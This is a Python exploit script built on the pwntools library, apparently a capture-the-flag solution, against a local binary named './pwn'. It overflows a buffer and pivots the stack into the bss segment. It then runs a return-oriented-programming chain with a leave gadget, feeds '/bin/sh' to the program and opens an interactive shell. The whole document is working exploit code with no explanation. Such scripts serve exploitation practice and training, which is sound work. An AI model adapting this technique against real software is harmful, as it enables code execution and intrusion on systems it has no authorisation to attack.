from pwn import *
context.log_level = "debug"
context.arch="amd64"
sh = process("./pwn")
def debug():
    gdb.attach(sh)
    pause()
def pwn():
    elf = ELF("./pwn")
    bss = elf.bss()
    bss4 = bss+0x900
    msg = 0x4040A0
    main_read = 0x40120A
    payload = flat([cyclic(0x20),bss4,main_read])
    sh.sendafter(b"who r u?\n", payload)
    sh.sendlineafter(b"life?\n", b'/bin/sh')
    # rbp -> bss4
    rop = ROP(elf)
    # rop.system(msg) #0x18
    rop.raw(0x4011DD) #0x8
    rop.raw(0xdeadbeef) #0x10
    rop.raw(0xdeadbeef) #0x18
    rop.raw(0xdeadbeef) #0x20
    rop.raw(bss4-0x28) #rbp
    rop.raw(rop.leave.address) #return address
    payload = rop.chain()
    debug()
    sh.sendafter(b"who r u?\n", payload)
    pause()
    sh.sendlineafter(b"life?\n", b'/bin/sh\x00')
    sh.interactive()
if __name__ == '__main__':
    pwn()